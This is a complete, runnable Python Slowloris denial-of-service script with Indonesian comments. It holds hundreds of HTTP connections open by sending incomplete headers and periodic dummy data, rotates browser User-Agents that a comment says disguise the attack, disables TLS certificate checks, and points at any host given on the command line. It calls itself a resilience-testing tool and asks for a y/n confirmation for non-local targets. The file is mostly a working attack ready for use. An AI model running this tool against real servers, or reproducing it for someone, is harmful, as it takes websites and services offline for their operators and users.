import socket
import ssl
import threading
import time
import argparse
import logging
import sys
import random
from concurrent.futures import ThreadPoolExecutor

# --- Konfigurasi Logging ---
# Atur logging ke DEBUG jika --verbose digunakan
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s')

# --- Global State dan Lock untuk Pelaporan ---
active_connections_count = 0
active_connections_lock = threading.Lock()

# --- Daftar User-Agent Populer ---
# Ini membantu menyamarkan serangan agar terlihat seperti dari browser sungguhan.
USER_AGENTS = [
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    b"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    b"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    b"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    # Tambahkan lebih banyak untuk variasi yang lebih baik
]

class SlowlorisSocket:
    """
    Kelas untuk mengelola satu koneksi Slowloris.
    Bertanggung jawab untuk inisialisasi socket, pengiriman header, dan menjaga koneksi tetap hidup.
    """
    def __init__(self, host: str, port: int, ssl_context: ssl.SSLContext,
                 http_method: str, http_path: str, http_version: str, custom_headers: dict):
        self.host = host
        self.port = port
        self.ssl_context = ssl_context
        self.http_method = http_method.upper()
        self.http_path = http_path
        self.http_version = http_version
        self.custom_headers = custom_headers
        self.sock = None
        self.is_connected = False
        self.last_sent_time = time.time()
        self.dummy_header_counter = 0

    def _connect(self):
        """Membuka koneksi TCP/IP dan SSL jika diperlukan."""
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(10) # Timeout untuk koneksi awal
            raw_sock.connect((self.host, self.port))
            
            if self.port == 443:
                self.sock = self.ssl_context.wrap_socket(raw_sock, server_hostname=self.host)
            else:
                self.sock = raw_sock
            
            self.sock.settimeout(None) # Setelah terhubung, nonaktifkan timeout untuk mencegah socket.timeout
                                      # Kita akan mengelola timeout secara logis.
            self.is_connected = True
            with active_connections_lock:
                global active_connections_count
                active_connections_count += 1
            logging.debug(f"Koneksi berhasil ke {self.host}:{self.port}")
            return True
        except (socket.timeout, socket.error, ssl.SSLError) as e:
            logging.warning(f"Gagal membuat koneksi: {e}")
            self._close()
            return False
        except Exception as e:
            logging.error(f"Kesalahan tak terduga saat membuat koneksi: {e}", exc_info=True)
            self._close()
            return False

    def _send_data(self, data: bytes):
        """Mengirim data melalui socket dan memperbarui last_sent_time."""
        try:
            self.sock.sendall(data)
            self.last_sent_time = time.time()
            return True
        except (socket.timeout, socket.error, ssl.SSLError) as e:
            logging.warning(f"Kesalahan saat mengirim data: {e}. Menutup koneksi.")
            self._close()
            return False
        except Exception as e:
            logging.error(f"Kesalahan tak terduga saat mengirim data: {e}", exc_info=True)
            self._close()
            return False

    def send_initial_headers(self) -> bool:
        """Mengirim baris permintaan dan header awal yang tidak lengkap."""
        if not self.is_connected:
            if not self._connect():
                return False

        try:
            # Baris permintaan HTTP
            request_line = f"{self.http_method} {self.http_path} {self.http_version}\r\n".encode('utf-8')
            if not self._send_data(request_line): return False
            logging.debug(f"Mengirim request line: {request_line.strip().decode('utf-8')}")

            # Header Host adalah wajib
            if not self._send_data(f"Host: {self.host}\r\n".encode('utf-8')): return False
            logging.debug(f"Mengirim Host header: Host: {self.host}")

            # Header standar yang lebih lengkap dari browser
            base_headers = {
                "User-Agent": random.choice(USER_AGENTS).decode('utf-8'),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Keep-Alive": "900", # Minta server untuk menjaga koneksi tetap hidup lebih lama
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }

            # Gabungkan custom_headers, custom_headers akan menimpa base_headers
            final_headers = {**base_headers, **self.custom_headers}

            # Jika metode POST, kita perlu menambahkan Content-Type dan Content-Length
            if self.http_method == "POST":
                # Trik Slowloris POST: set Content-Length tinggi tetapi kirim hanya sebagian kecil dari body
                content_length = random.randint(5000, 20000) # Ukuran body yang diharapkan (lebih besar)
                final_headers["Content-Type"] = "application/x-www-form-urlencoded"
                final_headers["Content-Length"] = str(content_length)
                logging.debug(f"POST request, Content-Length disetel ke {content_length}.")
            
            for key, value in final_headers.items():
                if key.lower() == "host": # Host sudah dikirim
                    continue
                header_line = f"{key}: {value}\r\n".encode('utf-8')
                if not self._send_data(header_line): return False
                logging.debug(f"Mengirim header: {header_line.strip().decode('utf-8')}")
                time.sleep(random.uniform(0.01, 0.05)) # Jeda kecil acak

            logging.info(f"Header awal (tidak lengkap) berhasil dikirim untuk {self.http_method} {self.http_path}.")
            return True

        except Exception as e:
            logging.error(f"Kesalahan saat mengirim header awal: {e}", exc_info=True)
            self._close()
            return False

    def send_dummy_data(self) -> bool:
        """Mengirim data dummy untuk menjaga koneksi tetap hidup."""
        if not self.is_connected:
            return False

        try:
            if self.http_method == "GET" or self.http_method == "HEAD":
                # Kirim header dummy untuk GET/HEAD
                self.dummy_header_counter += 1
                dummy_data = f"X-Dummy-{self.dummy_header_counter}: {random.randint(1000, 99999)}\r\n".encode('utf-8')
            elif self.http_method == "POST":
                # Kirim satu byte body untuk POST
                dummy_data = b"a" # Mengirim satu byte dari body yang diharapkan
            
            if not self._send_data(dummy_data): return False
            logging.debug(f"Mengirim data dummy: {dummy_data.strip().decode('utf-8', errors='ignore')}")
            return True
        except Exception as e:
            logging.error(f"Kesalahan saat mengirim data dummy: {e}", exc_info=True)
            self._close()
            return False

    def is_active(self) -> bool:
        """Memeriksa apakah socket masih terhubung."""
        return self.is_connected

    def _close(self):
        """Menutup socket dan memperbarui status koneksi."""
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
                self.sock.close()
            except OSError as e:
                logging.debug(f"Kesalahan saat menutup socket: {e} (mungkin sudah ditutup)")
            finally:
                self.sock = None
        if self.is_connected:
            self.is_connected = False
            with active_connections_lock:
                global active_connections_count
                active_connections_count -= 1
            logging.debug("Koneksi ditutup.")

class SlowlorisAttack:
    """
    Kelas utama untuk mengelola serangan Slowloris multi-threaded.
    """
    def __init__(self, host: str, port: int, num_threads: int, 
                 http_method: str, http_path: str, http_version: str, 
                 custom_headers: list, interval_min: int, interval_max: int):
        self.host = host
        self.port = port
        self.num_threads = num_threads
        self.http_method = http_method
        self.http_path = http_path
        self.http_version = http_version
        self.custom_headers_dict = self._parse_custom_headers(custom_headers)
        self.interval_min = interval_min
        self.interval_max = interval_max
        self.ssl_context = self._create_ssl_context()
        self.executor = None # ThreadPoolExecutor
        self.running_event = threading.Event() # Untuk menghentikan semua thread
        self.sockets: list[SlowlorisSocket] = [] # Daftar objek SlowlorisSocket

    def _parse_custom_headers(self, headers_list: list) -> dict:
        """Menguraikan daftar string header kustom menjadi kamus."""
        parsed = {}
        for header_str in headers_list:
            if ':' in header_str:
                key, value = header_str.split(':', 1)
                parsed[key.strip()] = value.strip()
            else:
                logging.warning(f"Header kustom tidak valid: '{header_str}'. Abaikan.")
        return parsed

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Membuat dan mengonfigurasi konteks SSL."""
        context = ssl.create_default_context()
        context.check_hostname = False # JANGAN periksa nama host
        context.verify_mode = ssl.CERT_NONE # JANGAN verifikasi sertifikat
        return context

    def _worker_thread_task(self):
        """Tugas yang dijalankan oleh setiap thread pekerja."""
        current_socket = SlowlorisSocket(self.host, self.port, self.ssl_context,
                                         self.http_method, self.http_path,
                                         self.http_version, self.custom_headers_dict)
        self.sockets.append(current_socket) # Tambahkan ke daftar pelacakan

        if not current_socket.send_initial_headers():
            logging.debug("Gagal mengirim header awal, menghentikan thread.")
            return

        while self.running_event.is_set(): # Terus berjalan selama event diatur
            sleep_duration = random.uniform(self.interval_min, self.interval_max)
            time.sleep(sleep_duration)
            if not current_socket.send_dummy_data():
                logging.debug("Gagal mengirim data dummy, mencoba membuka koneksi ulang.")
                # Coba reconnect jika koneksi putus
                current_socket._close()
                if not current_socket.send_initial_headers():
                    logging.debug("Gagal reconnect, menghentikan thread.")
                    break # Keluar dari loop jika reconnect gagal
        
        current_socket._close() # Pastikan socket ditutup saat thread selesai

    def start(self):
        """Memulai serangan."""
        logging.info(f"Memulai serangan Slowloris ke {self.host}:{self.port} dengan {self.num_threads} koneksi...")
        logging.info(f"Metode HTTP: {self.http_method.upper()}, Path: {self.http_path}, HTTP Version: {self.http_version}")
        logging.info(f"Interval pengiriman data: {self.interval_min}-{self.interval_max} detik.")
        
        self.running_event.set() # Set event untuk memulai semua thread
        self.executor = ThreadPoolExecutor(max_workers=self.num_threads)
        
        # Submit semua tugas ke thread pool
        futures = [self.executor.submit(self._worker_thread_task) for _ in range(self.num_threads)]

        try:
            # Loop utama untuk memantau status dan menunggu perintah Ctrl+C
            start_time = time.time()
            while self.running_event.is_set():
                elapsed_time = time.time() - start_time
                with active_connections_lock:
                    current_active = active_connections_count
                
                sys.stdout.write(
                    f"\rSerangan aktif selama: {int(elapsed_time)}s | "
                    f"Koneksi aktif: {current_active}/{self.num_threads} | "
                    f"Target: {self.host}:{self.port} "
                )
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            logging.info("\nSerangan dihentikan oleh pengguna (Ctrl+C).")
        except Exception as e:
            logging.error(f"\nKesalahan di main loop: {e}", exc_info=True)
        finally:
            self.stop()
            logging.info("Serangan Slowloris selesai.")

    def stop(self):
        """Menghentikan semua thread serangan dan membersihkan sumber daya."""
        if self.running_event.is_set():
            self.running_event.clear() # Memberi sinyal kepada thread untuk berhenti
            logging.info("Memberi sinyal kepada thread untuk berhenti. Menunggu penyelesaian...")
            
            if self.executor:
                self.executor.shutdown(wait=True) # Tunggu semua tugas selesai
                logging.info("ThreadPoolExecutor telah ditutup.")
            
            # Pastikan semua socket ditutup secara manual (jika ada yang terlewat oleh thread)
            for sock_obj in self.sockets:
                if sock_obj.is_active():
                    sock_obj._close()
            
            global active_connections_count
            active_connections_count = 0 # Reset hitungan koneksi aktif
            logging.info("Semua koneksi ditutup. Sumber daya dibersihkan.")

# --- Titik Masuk Program ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Skrip Serangan Slowloris tingkat lanjut untuk pengujian ketahanan server web.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "host", 
        type=str, 
        help="Alamat IP atau nama host target (misal: localhost, 192.168.1.1, example.com)"
    )
    parser.add_argument(
        "-p", "--port", 
        type=int, 
        default=443, 
        help="Port target (default: 443 untuk HTTPS)"
    )
    parser.add_argument(
        "-t", "--threads", 
        type=int, 
        default=200, 
        help="Jumlah thread/koneksi yang akan digunakan (default: 200)"
    )
    parser.add_argument(
        "-m", "--method",
        type=str,
        default="GET",
        choices=["GET", "POST", "HEAD"],
        help="Metode HTTP yang akan digunakan (default: GET)"
    )
    parser.add_argument(
        "-P", "--path",
        type=str,
        default="/",
        help="Path URL target (default: /)"
    )
    parser.add_argument(
        "-V", "--http_version",
        type=str,
        default="HTTP/1.1",
        choices=["HTTP/1.0", "HTTP/1.1"],
        help="Versi HTTP yang akan digunakan (default: HTTP/1.1)"
    )
    parser.add_argument(
        "-H", "--header",
        action="append",
        default=[],
        help="Tambahkan header HTTP kustom (misal: -H 'X-Custom: Value').\n"
             "Dapat digunakan beberapa kali."
    )
    parser.add_argument(
        "-i", "--interval",
        type=str,
        default="10-15",
        help="Rentang waktu (detik) untuk mengirim data dummy (min-max, misal: '10-15').\n"
             "Default: 10-15"
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Tampilkan output logging yang lebih detail (DEBUG level)"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    logging.info("=== Slowloris Attack Initializing ===")
    logging.info(f"Target: {args.host}:{args.port}")
    logging.info(f"Threads: {args.threads}")
    logging.info(f"Method: {args.method.upper()}")
    logging.info(f"Path: {args.path}")
    logging.info(f"HTTP Version: {args.http_version}")
    if args.header:
        logging.info(f"Custom Headers: {args.header}")
    logging.info(f"Interval: {args.interval}")

    # Parse interval
    try:
        min_interval, max_interval = map(int, args.interval.split('-'))
        if min_interval <= 0 or max_interval <= 0 or min_interval > max_interval:
            raise ValueError
    except ValueError:
        logging.critical("Format interval tidak valid. Gunakan format 'min-max', misal '10-15'.")
        sys.exit(1)

    # Memastikan tidak ada penggunaan yang tidak disengaja terhadap sistem penting
    if args.host not in ["localhost", "127.0.0.1"] and not input(f"Anda akan menyerang '{args.host}'. Apakah Anda yakin (y/n)? ").lower() == 'y':
        logging.critical("Pengguna membatalkan serangan. Keluar.")
        sys.exit(1)

    attack = SlowlorisAttack(
        host=args.host,
        port=args.port,
        num_threads=args.threads,
        http_method=args.method,
        http_path=args.path,
        http_version=args.http_version,
        custom_headers=args.header,
        interval_min=min_interval,
        interval_max=max_interval
    )
    attack.start()
    logging.info("Slowloris Attack selesai (atau dihentikan).")
